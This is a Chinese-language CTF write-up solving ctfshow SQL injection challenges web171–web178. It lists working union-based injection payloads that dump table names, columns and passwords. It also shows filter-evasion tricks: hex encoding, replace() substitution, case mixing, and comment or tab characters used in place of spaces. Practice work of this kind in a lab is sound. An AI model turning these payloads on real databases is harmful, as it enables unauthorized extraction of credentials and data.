ctfshow sql

---

检验一下这周成果

### web171

```python
-1' union select 1,2,database()--+   
#ctfshow_web
-1'union select 1,2,group_concat(table_name)from information_schema.tables where table_schema='ctfshow_web'--+
#ctfshow_user
-1'union select 1,2,group_concat(column_name)from information_schema.columns where table_name='ctfshow_user'--+
#id,username,password
-1'union select 1,2,group_concat(password)from ctfshow_web.ctfshow_user--+
#	admin,111,222,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,ctfshow{dcc61882-9232-4074-aef6-f9dd3b8432e8}
```



### web172

```python
-1'union select 1,database()--+
#ctfshow_web
-1'union select 1,group_concat(table_name)from information_schema.tables where table_schema='ctfshow_web'--+
#ctfshow_user,ctfshow_user2
-1'union select 1,group_concat(column_name)from information_schema.columns where table_name='ctfshow_user'--+
#id,username,password
```

1. ```python
   -1'union select 1,group_concat(password)from ctfshow_web.ctfshow_user--+
   #,flag_not_here
   ```

2. ```python
   -1'union select 1,group_concat(password)from ctfshow_web.ctfshow_user2--+
   #ctfshow{81b78f4d-57ff-439d-8f60-c763a7ef138e}
   ```

或者：

```python
-1' union select 1,(select password from ctfshow_user2 where username='flag')--+
```



### web173

注意到这个返回逻辑：

```php
//检查结果是否有flag
    if(!preg_match('/flag/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

我们采用hex编码后绕过即可

```python
-1' union select 1,2,(select hex(password) from ctfshow_user3 where username='flag')--+
```

```
63746673686F777B33646465656333372D353035352D343734652D386638342D6362613565626363303938317D
ctfshow{3ddeec37-5055-474e-8f84-cba5ebcc0981}
```



### web174

```php
//检查结果是否有flag
    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

不能使用数字了

看到的一种方法采用`replace`

```
replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,'A'),2,'B'),3,'C'),4,'D'),5,'E'),6,'F'),7,'G'),8,'H'),9,'I'),0,'J');
```

把数字换成字母

为了得到解码结果我用Python写了个小脚本

```
def decode_password(encoded_password):
    # 字母到数字的映射
    mapping = {
        'A': '1',
        'B': '2',
        'C': '3',
        'D': '4',
        'E': '5',
        'F': '6',
        'G': '7',
        'H': '8',
        'I': '9',
        'J': '0'
    }

    # 替换字母为数字
    decoded_password = ''.join(mapping.get(char, char) for char in encoded_password)

    return decoded_password


encoded_password = "aCaAAfAF-DFeG-DcEF-aCCH-CdFEJdAJIACD"
decoded_password = decode_password(encoded_password)
print("解码结果:", decoded_password)

```





### web176

正常操作发现过滤了union 和 select

采用大小写绕过可以成功

```python
-1'unIoN sElecT 1,2,group_concat(password)from ctfshow_web.ctfshow_user--+
#admin,111,222,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,passwordAUTO,ctfshow{9779c6ab-3826-4db2-b190-a988784fe4c9}
```



### web177

`union` 和`select`正常，发现应该是空格被过滤了,采用`/**/`

```
-1'union/**/select/**/1,2,group_concat(password)from/**/ctfshow_web.ctfshow_user--+
-1'/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username='flag'%23
```



### web178

试了一下也是过滤空格，但是`/**/`，`+`无法使用，

学习到了`%09` ---> 表示水平制表符 (Tab)。

```python
-1'%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username='flag'%23
#ctfshow{e1b39b75-ab9c-469c-aee2-6992a27fc792}
```

